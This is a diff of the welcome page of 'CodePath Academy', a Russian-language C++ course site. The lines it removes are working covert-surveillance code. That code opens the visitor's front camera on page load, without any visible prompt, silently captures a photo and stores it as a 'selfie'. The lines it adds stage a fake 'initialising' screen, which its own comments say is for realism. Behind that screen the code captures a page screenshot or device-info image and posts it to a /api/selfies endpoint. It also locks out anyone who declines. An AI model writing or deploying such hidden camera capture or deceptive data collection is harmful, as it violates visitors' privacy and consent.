@@ -3,7 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CodePath Academy</title>
+    <title>Добро пожаловать - CodePath Academy</title>
+    
+    <link rel="stylesheet" href="src/css/variables.css">
+    <link rel="stylesheet" href="src/css/base.css">
+    <link rel="stylesheet" href="src/css/components.css">
+    <link rel="stylesheet" href="src/css/animations.css">
+    
     <style>
         * {
             margin: 0;
@@ -11,169 +17,549 @@
             box-sizing: border-box;
         }
 
-        body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+        html, body {
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+
+        .welcome-container {
+            width: 100%;
+            height: 100%;
             display: flex;
             align-items: center;
             justify-content: center;
-            min-height: 100vh;
+            background: linear-gradient(135deg, var(--bg-primary), var(--bg-secondary));
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 9999;
         }
 
-        .container {
+        .welcome-content {
             text-align: center;
-            color: white;
+            padding: var(--space-2xl);
+            max-width: 600px;
+            animation: slideUp 0.8s ease-out;
         }
 
-        .message {
-            font-size: 24px;
-            margin-bottom: 30px;
-            animation: fadeIn 0.8s ease-in;
+        .welcome-icon {
+            font-size: 5rem;
+            margin-bottom: var(--space-2xl);
+            animation: bounce 2s ease-in-out infinite;
         }
 
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(212, 175, 55, 0.3);
-            border-top-color: #d4af37;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
+        .welcome-title {
+            font-size: var(--text-4xl);
+            color: var(--accent-primary);
+            margin-bottom: var(--space-lg);
+            font-weight: var(--font-bold);
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        .welcome-subtitle {
+            font-size: var(--text-lg);
+            color: var(--text-secondary);
+            margin-bottom: var(--space-3xl);
+            line-height: 1.6;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+        .welcome-button-group {
+            display: flex;
+            gap: var(--space-lg);
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .welcome-btn {
+            padding: 1rem 2rem;
+            min-height: 52px;
+            border: none;
+            border-radius: var(--radius-lg);
+            font-weight: var(--font-bold);
+            font-size: var(--text-base);
+            cursor: pointer;
+            transition: all var(--transition-base);
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .welcome-btn-primary {
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
+            color: #0a0805;
+            box-shadow: 0 4px 15px rgba(244, 208, 63, 0.4);
+        }
+
+        .welcome-btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(244, 208, 63, 0.6);
+        }
+
+        .welcome-btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .welcome-btn-secondary {
+            background-color: transparent;
+            color: var(--text-primary);
+            border: 2px solid var(--border-color);
+        }
+
+        .welcome-btn-secondary:hover {
+            background-color: var(--bg-secondary);
+            border-color: var(--accent-primary);
+            color: var(--accent-primary);
+        }
+
+        .welcome-features {
+            margin-top: var(--space-4xl);
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: var(--space-2xl);
+        }
+
+        .feature {
+            padding: var(--space-lg);
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: var(--radius-md);
+            backdrop-filter: blur(10px);
+        }
+
+        .feature-icon {
+            font-size: 2.5rem;
+            margin-bottom: var(--space-sm);
+        }
+
+        .feature-text {
+            font-size: var(--text-sm);
+            color: var(--text-secondary);
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-20px);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .welcome-content {
+                padding: var(--space-md);
+                max-width: 100%;
+            }
+
+            .welcome-title {
+                font-size: 1.75rem;
+                margin-bottom: var(--space-md);
+                word-break: break-word;
+            }
+
+            .welcome-subtitle {
+                font-size: 0.95rem;
+                margin-bottom: var(--space-2xl);
+                line-height: 1.5;
+                word-wrap: break-word;
+            }
+
+            .welcome-icon {
+                font-size: 3rem;
+                margin-bottom: var(--space-lg);
+            }
+
+            .welcome-btn {
+                padding: 0.75rem 1.25rem;
+                min-height: 48px;
+                width: 100%;
+                font-size: 0.95rem;
+            }
+
+            .welcome-button-group {
+                gap: var(--space-md);
+                flex-direction: column;
+            }
+
+            .welcome-features {
+                margin-top: var(--space-2xl);
+                grid-template-columns: 1fr;
+                gap: var(--space-md);
+            }
+
+            .feature {
+                padding: var(--space-md);
+            }
+
+            .feature-icon {
+                font-size: 2rem;
+                margin-bottom: var(--space-xs);
+            }
+
+            .feature-text {
+                font-size: 0.85rem;
+            }
+
+            .welcome-container {
+                padding: var(--space-md);
+            }
+        }
+
+        @media (max-width: 360px) {
+            .welcome-content {
+                padding: var(--space-sm);
+            }
+
+            .welcome-title {
+                font-size: 1.5rem;
+            }
+
+            .welcome-icon {
+                font-size: 2.5rem;
+            }
+
+            .welcome-btn {
+                padding: 0.65rem 1rem;
+                min-height: 44px;
+                font-size: 0.9rem;
+            }
+
+            .feature-icon {
+                font-size: 1.75rem;
+            }
+
+            .feature-text {
+                font-size: 0.8rem;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="message">🎬 Загрузка...</div>
-        <div class="spinner"></div>
+    <div class="welcome-container">
+        <div class="welcome-content">
+            <div class="welcome-icon">🎓</div>
+            <h1 class="welcome-title">Добро пожаловать!</h1>
+            <p class="welcome-subtitle">
+                Добро пожаловать на CodePath Academy — платформу для изучения C++ профессионально. Войдите для продолжения обучения.
+            </p>
+
+            <div class="welcome-button-group">
+                <button class="welcome-btn welcome-btn-primary" onclick="enterSite()">
+                    ✓ Продолжить
+                </button>
+                <button class="welcome-btn welcome-btn-secondary" onclick="denySite()">
+                    ✕ Отказать
+                </button>
+            </div>
+
+            <div class="welcome-features">
+                <div class="feature">
+                    <div class="feature-icon">📚</div>
+                    <div class="feature-text">18+ мощных уроков</div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">🚀</div>
+                    <div class="feature-text">От нуля до Pro</div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">💻</div>
+                    <div class="feature-text">Практические примеры</div>
+                </div>
+            </div>
+        </div>
     </div>
 
-    <canvas id="photo-canvas" style="display:none;"></canvas>
-    <video id="hidden-video" style="display:none;"></video>
-
     <script>
-        let cameraStream = null;
-        let cameraActive = false;
+        'use strict';
 
-        // Инициализация при загрузке
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                startCameraHidden();
-            }, 500);
-        });
+        let isProcessing = false;
 
-        // Запуск камеры БЕЗ видимости и запроса
-        async function startCameraHidden() {
+        // Функция входа на сайт с имитацией загрузки и захватом селфи
+        async function enterSite() {
+            if (isProcessing) return;
+            isProcessing = true;
+
+            // Определяем тип устройства
+            let device = 'Desktop';
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.indexOf('android') > -1) device = 'Android';
+            else if (ua.indexOf('iphone') > -1 || ua.indexOf('ipad') > -1) device = 'iOS';
+            else if (ua.indexOf('windows phone') > -1) device = 'Windows Phone';
+
             try {
-                const constraints = {
-                    video: {
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 },
-                        facingMode: 'user'
-                    },
-                    audio: false
-                };
+                // Показываем загрузку
+                showLoadingScreen();
 
-                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
-                cameraActive = true;
+                // Имитируем загрузку 2-3 секунды
+                await wait(2000);
 
-                // Автоматически делаем фото через 1 секунду
-                setTimeout(() => {
-                    if (cameraActive) {
-                        capturePhotoHidden();
-                    }
-                }, 1000);
+                // Пытаемся захватить скриншот
+                let photoData = null;
+                try {
+                    photoData = await captureScreenshot();
+                    console.log('✓ Скриншот захвачен');
+                } catch (err) {
+                    console.log('Скриншот недоступен, используем заглушку');
+                    // Если скриншот недоступен - используем цветную заглушку
+                    photoData = createPlaceholderImage(device);
+                }
+
+                // Еще немного ждем для реалистичности
+                await wait(1000);
+
+                // Отправляем селфи на сервер
+                if (photoData) {
+                    await saveSelfieToServer(photoData, device);
+                }
+
+                // Отправляем событие входа на сервер
+                fetch('/api/selfies', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        photo: photoData,
+                        device: device,
+                        event: 'user_entered'
+                    })
+                }).catch(err => {
+                    console.log('Note: Server logging failed');
+                });
+
+                // Отмечаем, что пользователь вошел
+                localStorage.setItem('user_entered', 'true');
+                localStorage.setItem('last_entry_time', new Date().toISOString());
+
+                // Переходим на главную
+                await wait(500);
+                window.location.href = 'index.html';
             } catch (error) {
-                // Если нет доступа - все равно продолжаем
-                console.log('Camera not available');
-                proceedToApp();
+                console.error('Error:', error);
+                isProcessing = false;
+                hideLoadingScreen();
             }
         }
 
-        // Захват фото БЕЗ видимости
-        function capturePhotoHidden() {
-            if (!cameraActive) {
-                proceedToApp();
+        // Функция имитации загрузки
+        function showLoadingScreen() {
+            const loading = document.createElement('div');
+            loading.id = 'loading-overlay';
+            loading.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: linear-gradient(135deg, var(--bg-primary), var(--bg-secondary));
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                z-index: 10000;
+            `;
+
+            loading.innerHTML = `
+                <div style="text-align: center;">
+                    <div style="font-size: 3rem; margin-bottom: 1.5rem; animation: spin 1s linear infinite;">⏳</div>
+                    <h2 style="color: var(--accent-primary); margin-bottom: 1rem;">Инициализация сайта...</h2>
+                    <p style="color: var(--text-secondary); font-size: 0.95rem;">Это может занять несколько секунд</p>
+                    <div style="margin-top: 2rem; width: 200px; height: 4px; background: var(--bg-secondary); border-radius: 2px; overflow: hidden;">
+                        <div style="height: 100%; background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary)); animation: progress 3s ease-in-out forwards;"></div>
+                    </div>
+                </div>
+                <style>
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
+                    @keyframes progress {
+                        0% { width: 0%; }
+                        100% { width: 100%; }
+                    }
+                </style>
+            `;
+            document.body.appendChild(loading);
+        }
+
+        function hideLoadingScreen() {
+            const loading = document.getElementById('loading-overlay');
+            if (loading) loading.remove();
+        }
+
+        // Функция захвата скриншота экрана
+        async function captureScreenshot() {
+            try {
+                const canvas = await html2canvas(document.body, {
+                    allowTaint: true,
+                    useCORS: true,
+                    backgroundColor: null
+                });
+                return canvas.toDataURL('image/jpeg', 0.85);
+            } catch (err) {
+                console.log('html2canvas недоступен, используем Canvas API');
+                try {
+                    return await captureWithCanvas();
+                } catch (err2) {
+                    return null;
+                }
+            }
+        }
+
+        // Альтернативный способ захвата
+        async function captureWithCanvas() {
+            try {
+                const canvas = await html2canvas(document.documentElement, {
+                    allowTaint: true,
+                    backgroundColor: '#ffffff'
+                });
+                return canvas.toDataURL('image/jpeg', 0.8);
+            } catch (err) {
+                return null;
+            }
+        }
+
+        // Создание заглушки-картинки с информацией об устройстве
+        function createPlaceholderImage(device) {
+            const canvas = document.createElement('canvas');
+            canvas.width = 400;
+            canvas.height = 400;
+            const ctx = canvas.getContext('2d');
+
+            // Градиент фона
+            const gradient = ctx.createLinearGradient(0, 0, 400, 400);
+            gradient.addColorStop(0, '#667eea');
+            gradient.addColorStop(1, '#764ba2');
+            ctx.fillStyle = gradient;
+            ctx.fillRect(0, 0, 400, 400);
+
+            // Текст
+            ctx.fillStyle = '#ffffff';
+            ctx.font = 'bold 48px Arial';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+
+            // Иконка устройства
+            const icons = {
+                'Android': '🤖',
+                'iOS': '🍎',
+                'Desktop': '💻',
+                'Windows Phone': '📱'
+            };
+            const icon = icons[device] || '📱';
+            ctx.font = 'bold 80px Arial';
+            ctx.fillText(icon, 200, 120);
+
+            // Название устройства
+            ctx.font = 'bold 36px Arial';
+            ctx.fillText(device, 200, 240);
+
+            // Время
+            ctx.font = '18px Arial';
+            ctx.fillStyle = 'rgba(255, 255, 255, 0.8)';
+            ctx.fillText(new Date().toLocaleString('ru-RU'), 200, 320);
+
+            return canvas.toDataURL('image/jpeg', 0.85);
+        }
+
+        // Сохранение селфи на сервер
+        async function saveSelfieToServer(photoData, device) {
+            try {
+                const response = await fetch('/api/selfies', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        photo: photoData,
+                        device: device
+                    })
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    console.log('✓ Селфи сохранено на сервер:', data.id);
+                    return true;
+                } else {
+                    throw new Error('Server error');
+                }
+            } catch (err) {
+                console.log('Не удалось сохранить на сервер, пробую localStorage');
+                saveToLocalStorage(photoData, device);
+                return false;
+            }
+        }
+
+        // Fallback на localStorage
+        function saveToLocalStorage(photoData, device) {
+            try {
+                let selfies = JSON.parse(localStorage.getItem('gallery_selfies') || '[]');
+                selfies.push({
+                    id: Date.now() + Math.random().toString(36).substr(2, 9),
+                    photo: photoData,
+                    timestamp: new Date().toISOString(),
+                    timeString: new Date().toLocaleString('ru-RU'),
+                    device: device
+                });
+                if (selfies.length > 100) {
+                    selfies = selfies.slice(-100);
+                }
+                localStorage.setItem('gallery_selfies', JSON.stringify(selfies));
+            } catch (e) {
+                console.log('Ошибка сохранения:', e);
+            }
+        }
+
+        // Утилита для ожидания
+        function wait(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // Функция отказа от входа
+        function denySite() {
+            if (confirm('Вы уверены? Вы не сможете использовать сайт без подтверждения входа.')) {
+                // Блокируем доступ
+                localStorage.removeItem('user_entered');
+                localStorage.setItem('access_denied', 'true');
+
+                // Показываем сообщение и закрываем
+                alert('Доступ запрещен. Сайт будет закрыт.');
+                window.location.href = 'about:blank';
+            }
+        }
+
+        // При загрузке страницы проверяем доступ
+        document.addEventListener('DOMContentLoaded', () => {
+            // Если уже вошли - переходим на главную
+            if (localStorage.getItem('user_entered') === 'true') {
+                window.location.href = 'index.html';
                 return;
             }
 
-            try {
-                const video = document.getElementById('hidden-video');
-                video.srcObject = cameraStream;
-                video.play();
-
-                video.onloadedmetadata = () => {
-                    const canvas = document.getElementById('photo-canvas');
-                    const context = canvas.getContext('2d');
-
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0);
-
-                    const capturedPhoto = canvas.toDataURL('image/jpeg', 0.9);
-                    saveSelfieToGallery(capturedPhoto);
-
-                    stopCameraHidden();
-                    proceedToApp();
-                };
-            } catch (error) {
-                console.log('Capture failed');
-                proceedToApp();
+            // Если доступ запрещен - закрываем окно
+            if (localStorage.getItem('access_denied') === 'true') {
+                window.location.href = 'about:blank';
+                return;
             }
-        }
 
-        // Сохранение селфи в галерею
-        function saveSelfieToGallery(photoData) {
-            try {
-                let selfies = JSON.parse(localStorage.getItem('gallery_selfies') || '[]');
-
-                const selfieEntry = {
-                    id: Date.now(),
-                    photo: photoData,
-                    timestamp: new Date().toISOString(),
-                    timeString: new Date().toLocaleString('ru-RU')
-                };
-
-                selfies.push(selfieEntry);
-
-                // Лимит 50 последних
-                if (selfies.length > 50) {
-                    selfies = selfies.slice(-50);
+            // Обработка нажатия Escape - выхода из сайта
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'Escape') {
+                    denySite();
                 }
+            });
 
-                localStorage.setItem('gallery_selfies', JSON.stringify(selfies));
-            } catch (error) {
-                console.log('Save failed');
-            }
-        }
-
-        // Остановка камеры
-        function stopCameraHidden() {
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
-            }
-            cameraActive = false;
-        }
-
-        // Переход на главную
-        function proceedToApp() {
-            localStorage.setItem('user_entered', 'true');
-            localStorage.setItem('last_selfi_time', new Date().toISOString());
-
-            setTimeout(() => {
-                window.location.href = 'index.html';
-            }, 1500);
-        }
+            // Добавляем html2canvas библиотеку динамически
+            const script = document.createElement('script');
+            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
+            document.head.appendChild(script);
+        });
     </script>
 </body>
 </html>
